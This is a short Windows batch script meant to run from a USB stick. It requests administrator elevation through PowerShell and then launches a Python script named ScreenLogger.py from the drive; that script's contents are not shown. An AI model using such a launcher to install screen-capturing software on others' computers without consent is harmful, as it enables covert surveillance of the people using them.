@echo off
:: Get the drive letter of the USB stick
set USB_DRIVE=%~d0

:: Check if the script is running as admin
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    :: If not running as admin, prompt for elevation
    echo Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit /b
)

:: Run the Python script from the USB drive
python "%USB_DRIVE%\ScreenLogger.py"
